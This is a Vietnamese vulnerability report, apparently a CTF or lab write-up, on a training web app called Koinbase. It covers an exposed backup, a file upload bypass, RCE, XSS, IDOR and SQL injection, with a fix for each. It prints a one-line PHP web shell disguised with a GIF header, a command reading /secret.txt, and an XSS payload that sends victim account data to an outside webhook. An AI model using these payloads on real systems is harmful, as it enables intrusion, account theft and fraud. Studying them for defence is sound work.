# CẢNH BÁO LỖ HỔNG

## Tổng quan
Koinbase là ứng dụng web với các tính năng chính như sau:

 1. Đăng ký hoặc đăng nhập.
 2. Cập nhật thông tin tài khoản: Avatar, Credit card, Bio.
 3. Bảng xếp hạn người dùng.
 4. Chuyển tiền.

Trang web gồm có 2 domain như sau:
 - **Web-Main** [https://koinbase-ff27148a4.cyberjutsu-lab.tech](https://koinbase-ff27148a4.cyberjutsu-lab.tech) => Trang web chính thức.
 - **Web-Upload**: [https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) => Trang web dùng để xử lý tính năng upload avatar và lưu trữ hình avatar.


## Mục lục

- #### KB-01-Operation: lộ link tải mã nguồn của 2 trang web tại [/robots.txt](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/robots.txt) 

- #### KB-02-FileUpload: Lỗi File Upload cho phép tải tập tin có chứa mã độc lên trang [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) tại API [/index.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/index.php)

- #### KB-03-RCE: Lỗi RCE cho phép thực thi mã từ xa tại [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech)  API [/upload/14c78e3702622bb0.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php) 

- #### KB-04-XSS: Lỗi XSS cho phép đánh cấp thông tin người dùng tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API  [/index.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/index.php)

- #### KB-05-IDOR: Lỗi IDOR cho phép chuyển tiền tùy ý giữa các tài khoản với nhau tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API [/api/transaction.php?action=transfer_money](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money)

- #### KB-06-SLQi: Lỗi Sql Injection cho phép lấy thông tin của tài khoản bất kỳ tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API [/api/user.php?action=public_info](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/user.php?action=public_info)


## KB-01-Operation: lộ link tải mã nguồn của 2 trang web tại [/robots.txt](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/robots.txt) 

### Description
Từ nội dung của tập tin [/robots.txt](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/robots.txt)  tại [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) phát hiện tập tin  **backup.zip** tại đường dẫn [/backup.zip](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/backup.zip) chứa toàn bộ mã nguồn của 2 trang [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) và [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech). 

### Impact
Dựa vào mã nguồn có sẵn kẻ tấn công có thể tìm ra được các lỗi bảo mật như: **XSS**, **SQL INJECTION**, **IDOR**, **FILE UPLOAD**, **RCE**... từ đó có thể tấn công phá hoại, đánh cấp dữ liệu hoặc chiếm quyền điều khiển máy chủ.

### Root Cause Analysis
Tập tin [/backup.zip](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/backup.zip) được quyền truy cập công khai mà không có cơ chế bảo vệ.

### Steps to reproduce

 1. Truy cập vào trang web [https://koinbase-ff27148a4.cyberjutsu-lab.tech/](https://koinbase-ff27148a4.cyberjutsu-lab.tech/) => đăng ký tài khoản và sau đó đăng nhập vào hệ thống.
 2. Truy cập trang [/profile.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/profile.php) => Cập nhật avatar thành công => hệ thống sẽ lưu lại hình avatar tại domain [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech).
 3. Dùng công cụ [**FFUF**](https://github.com/ffuf/ffuf#get-parameter-fuzzing) để scan danh sách tập tin và thư mục của domain [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech).
```
ffuf -w /root/wordlists/common.txt -u https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/FUZZ -fc 403
```
*Câu lệnh scan danh sách tập tin và thư mục của domain **upload.koinbase-ff27148a4.cyberjutsu-lab.tech***

[**/root/wordlists/common.txt**](https://github.com/facetofate/cbjs-test/blob/main/common.txt): worldlist dùng để brute force.

![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/FFUF-Scan.JPG)

*Kết quả sau khi chạy câu lệnh [**FFUF**](https://github.com/ffuf/ffuf#get-parameter-fuzzing) ở trên*.

 4. Đọc nội dung tập tin [/robots.txt](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/robots.txt) sẽ có được đường dẫn tải tập tin **backup.zip** như sau.
```
User-agent: *
Disallow: /backup.zip
```
Truy cập vào đường dẫn [https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/backup.zip](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/backup.zip) để tải tập tin **backup.zip**

5. Giải nén tập tin **backup.zip** vào thư mục **backup** và tìm đến tập tin **backup\docker-compose.yml** => line 4 sẽ có được **FLAG**

![FLAG 1](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-01-SrcWeb-Flag.JPG)
*FLAG 1*

### Attachments

### Recommendations

 - Không lưu trữ các bản sao lưu mã nguồn trên cùng máy chủ đang chạy web.

### References


## KB-02-FileUpload: Lỗi File Upload cho phép tải tập tin có chứa mã độc lên trang [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) tại API [/index.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/index.php)

### Description

Tính năng upload avatar của trang [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) tại đường dẫn [/profile.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/profile.php) cho phép kẻ tấn công có thể upload các tập tin có chứa mã độc lên trang [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech).

Lỗi được phát hiện tại API [/index.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/index.php) của trang [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) 

### Impact

 - Lỗi tìm ẩn rủi ro rất cao khi kẻ tấn công có thể tìm ra cách để **RCE** khi  đã upload shell thành công lên máy chủ.

### Root Cause Analysis
 API [/index.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/index.php) của trang [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) khi xử lý upload ảnh để kiểm tra file tải lên có phải là ảnh hay không dựa vào **MIME Type** mà không kiểm tra **file extension** do đó kẻ tấn công có thể tải lên tập tin chứa mã độc có phần mở rộng tùy ý như: **.PHP**, **PHTML** ...  

### Steps to reproduce

 1. Chuẩn bị file [**ava.png.php**](https://github.com/facetofate/cbjs-test/raw/main/ava.png.php) có chứa mã độc và [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) như sau:
```
GIF89a<?php system($_GET["cmd"]); ?>
```
**GIF89a** => Bypass phần kiểm tra **MIME Type** hệ thống sẽ xem đây là file hình có định dạng **image/gif** .
 2. Gửi yêu cầu upload avatar lên [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech) bằng cách gọi API [/index.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/index.php).

![Upload ava.png.php thành công](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-02-FU-up-ava-.JPG)

Tập tin [*/upload/14c78e3702622bb0.php*](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php) được upload thành công.

### Attachments


### Recommendations

 - Kiểm tra **file extension** phải thuộc whitelist vd: `['.png','gif']`
 - Kiểm tra **MIME Type** phải thuộc whitelist vd: `['image/jpeg','image/png']`
```
// DO NOT TRUST $_FILES['upfile']['mime'] VALUE !!  
// Check MIME Type by yourself.  
$finfo = new finfo(FILEINFO_MIME_TYPE);  
if (false === $ext = array_search(  
	$finfo->file($_FILES['upfile']['tmp_name']),  
	array(  
		'jpg' => 'image/jpeg',  
		'png' => 'image/png',  
		'gif' => 'image/gif',  
	),true)
){  
	throw new RuntimeException('Invalid file format.');  
}
```
 - Không sử dụng tên của tập tin được tải lên hệ thống tự random tạo ra tên mới.
 - Dùng môi trường sandbox để xử lý việc upload file.

### References

 - [https://www.php.net/manual/en/features.file-upload.php](https://www.php.net/manual/en/features.file-upload.php)

## KB-03-RCE: Lỗi RCE cho phép thực thi mã từ xa tại [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech)  API [/upload/14c78e3702622bb0.php](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php)

### Description
Kẻ tấn công có thể **RCE** bằng cách gửi request kèm param "**cmd**" vào đường link sau:
[https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php?cmd=](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php?cmd=)

### Impact
 - Kẻ tấn công có thể thực thi lệnh OS COMMAND bất kỳ.
 - Có thể đánh cấp toàn bộ dữ liệu từ máy chủ [**Web-Upload**](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech). 

### Root Cause Analysis
Lỗi xảy ra do kẻ tấn công đã khai thác được lỗi File Upload (**KB-02-FileUpload**)  và đã thành công upload được tập tin có chứa mã độc có tên **14c78e3702622bb0.php** vào thư mục **/upload** thư mục này có thể được truy cập công khai do đó kể tấn công chỉ cần gửi request kèm param "**cmd**" vào link [https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php?cmd=](https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php?cmd=) là có thể **RCE** thành công.

### Steps to reproduce
1. Gửi request với PAYLOAD như sau để **RCE** trên máy chủ
```
GET https://upload.koinbase-ff27148a4.cyberjutsu-lab.tech/upload/14c78e3702622bb0.php)?cmd=cat%20/secret.txt
```
![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-03-RCE-flag.JPG)
*FLAG 2*
**\$_GET['cmd']**: OS COMMAND sẽ được thực thi trên máy chủ (`cat /secret.txt`). 

### Attachments

### Recommendations
- Không chạy webserver dưới quyền root để hạn chế mức độ ảnh hưởng
- Thường xuyên quét virus định kỳ trên máy chủ.

### References


## KB-04-XSS: Lỗi XSS cho phép đánh cấp thông tin người dùng tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API  [/index.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/index.php)

### Description
Khai thác tính năng phân trang của page [/index.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/index.php) kẻ tấn công có thể chèn thêm đoạn **HTML** và  **JAVASCRIPT** thông qua biến "**$_GET['page']**"  để mạo danh người dùng nhằm đánh cấp thông tin hoặc kiểm soát tài khoản của nạn nhân.

### Impact

 - Kẻ tấn công có thể lấy cấp các thông tin về tài khoản của nạn nhân như: Id, tên đăng nhập, số dư tài khoản, Credit card, avatar, bio...
 - Có thể giả mạo nạn nhân để thực hiện lệnh chuyển tiền từ tài khoản của nạn nhân về tài khoản của kẻ tấn công.
 - Ngoài ra kẻ tấn công còn có thể thay đổi tùy ý thông tin tài khoản của nạn nhân.

### Root Cause Analysis

Do không sử dụng hàm **HTML ENCODE** để mã hóa giá trị của biến "**$_GET['page']**" trước khi hiển thị lên trình duyệt.

### Steps to reproduce

 1. Vào trang [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) sau khi đăng nhập thành công hệ thống sẽ tự chuyển qua trang [/index.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/index.php) tại đây sử dụng tính năng phân trang để di chuyển qua lại giữa các trang.
 2. Thay đổi giá trị của biến "**$_GET['page']**" trên thanh địa chỉ thành PAYLOAD sau:
```
https://koinbase-ff27148a4.cyberjutsu-lab.tech/?page=<img%20src="/api/user.php?action=detail_info"%20alt="GEThttps://webhook.site/42ea281f-d084-47a7-b9d5-49a0e71cc3de?c="%20onerror="var req=new XMLHttpRequest();req.open(this.alt.substring(0,3),this.src,false);req.send(null);var js=req.responseText;req=new XMLHttpRequest();req.open(this.alt.substring(0,3),this.alt.substring(3).concat(js),false);req.send(null);"/>
```
 3. Đoạn PAYLOAD ở trên sẽ được gửi cho nạn nhân khi nạn nhân CLICK vào liên kết ngay lập tức thông tin tài khoản của nạn nhân sẽ bị đánh cấp và gửi về máy chủ của kẻ tấn công.

![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-04-XSS-info.JPG)
 *FLAG 3*

### Attachments


### Recommendations
- Sử dụng hàm HTML ENCODE để mã hóa nội dung có chứa các thẻ **HTML** trước khi cho hiển thị lên website.
```
<?php  
$str = '<a href="https://www.w3schools.com">Go to w3schools.com</a>';  
echo htmlentities($str);  
?>
```
*Đoạn code PHP mã hóa thẻ HTML*

### References
[https://www.w3schools.com/php/func_string_htmlentities.asp](https://www.w3schools.com/php/func_string_htmlentities.asp)

## KB-05-IDOR: Lỗi IDOR cho phép chuyển tiền tùy ý giữa các tài khoản với nhau tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API [/api/transaction.php?action=transfer_money](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money)

### Description
Kẻ tấn công có thể chuyển tiền tùy ý giữa các tài khoản với nhau bằng cách thay đổi tùy ý giá trị của các biến "**\$_POST['sender_id']**", và "**\$_POST['receiver_id']**" tại API [/api/transaction.php?action=transfer_money](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/transaction.php?action=transfer_money)  

### Impact
Kẻ tấn công có thể chuyển tiền từ 1 tài khoản bất kỳ của nạn nhân đến tài khoản của mình.

### Root Cause Analysis
Người thực hiện yêu cầu chuyển tiền và người chuyển là 2 tài khoản khác nhau chương trình không ràng buộc 2 tài khoản trên phải là một nên kẻ tấn công có thể tùy ý chuyển tiền từ 1 tài khoản bất kỳ của nạn nhân đến tài khoản của mình miễn là tài khoản của nạn nhân có số dư lớn hơn số tiền cần chuyển.

### Steps to reproduce

1. Vào trang [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) đăng nhập vào hệ thống.
2. Thực hiện yêu cầu chuyển tiền bằng cách sử dụng PAYLOAD sau:
![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-05-IDOR-tranfer-info.JPG)

**sender_id**: ID tài khoản của nạn nhân, kẻ tấn công có thể thay đổi tùy ý mà không bị ràng buộc bởi chương trình.
*Chú ý: có thể lấy ID tài khoản của nạn nhân từ danh sách được hiển tại trang [/index.php?page=1](https://koinbase-ff27148a4.cyberjutsu-lab.tech/index.php?page=1)*
**receiver_id**: ID tài khoản người thụ hưởng cũng là tài khoản của kẻ tấn công.

3. Tiếp tục thực hiện lệnh chuyển tiền sao cho tài khoản có số dư lớn hơn 1 triệu lúc này có thể vào trang [/profile.php](https://koinbase-ff27148a4.cyberjutsu-lab.tech/profile.php) để lấy được **FLAG**.

![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-05-IDOR-flag.JPG)
*FLAG 4*

### Attachments


### Recommendations

Kiểm tra ràng buộc đảm bảo tài khoản người thực hiện yêu cầu chuyển tiền và người chuyển phải là 1 (**sender_id** = **session_user_id**).
**session_user_id** : ID của tài khoản đã đăng nhập vào hệ thống và đang thực hiện yêu cầu chuyển tiền.

### References


## KB-06-SLQi: Lỗi Sql Injection cho phép lấy thông tin của tài khoản bất kỳ tại [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech) API [/api/user.php?action=public_info](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/user.php?action=public_info)

### Description
API [/api/user.php?action=public_info&id=](https://koinbase-ff27148a4.cyberjutsu-lab.tech/api/user.php?action=public_info) có thể chèn thêm câu lệnh truy vấn bằng cách thay đổi giá trị của biến **\$_GET['id']**. 

### Impact
Kẻ tấn công có thể chèn thêm câu lệnh **SELECT** để đánh cấp thông tin có trong cơ sở dữ liệu.

### Root Cause Analysis

Khi thực hiện câu truy vấn để lấy dữ liệu chương trình không sử dụng **prepared statements and parameterized queries** mà truyền thẳng giá trị của biến **\$_GET['id']** vào câu query do đó kẻ tấn công có thể lợi dụng để chèn thêm 1 đoạn query vào phía sau của câu query có sẵn.

### Steps to reproduce
1. Vào trang [**Web-Main**](https://koinbase-ff27148a4.cyberjutsu-lab.tech)  đăng nhập vào hệ thống.
2. Thực hiện yêu cầu như PAYLOAD sau để tìm table lưu **FLAG**
![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-06-Sqli-tbname.JPG)

3. Thực hiện yêu cầu như PAYLOAD sau để lấy **FLAG** được lưu trong table **flag**
![enter image description here](https://raw.githubusercontent.com/facetofate/cbjs-test/main/img/KB-06-Sqli-flag.JPG)
*FLAG 5*

### Attachments


### Recommendations

- Sử dụng **prepared statements and parameterized queries** để thực hiện truy vấn dữ liệu. 
1. Using  [PDO](https://www.php.net/manual/en/book.pdo.php)  (for any supported database driver):
```
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');  
$stmt->execute(array('name' => $name));  
foreach ($stmt as $row) 
{  
	// do something with $row  
}
```

2. Using  [MySQLi](https://www.php.net/manual/en/book.mysqli.php)  (for MySQL):
```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');  
$stmt->bind_param('s', $name);  
$stmt->execute();  
$result = $stmt->get_result();  
while ($row = $result->fetch_assoc()) {  
	// do something with $row  
}
```
- Cấu hình không cho Mysql có thể thực thi các lệnh đọc và ghi file.
- Không nên chạy MySql dưới quyền root.
- Không cho thực thị multi query.

### References
- [https://owasp.org/www-community/attacks/SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
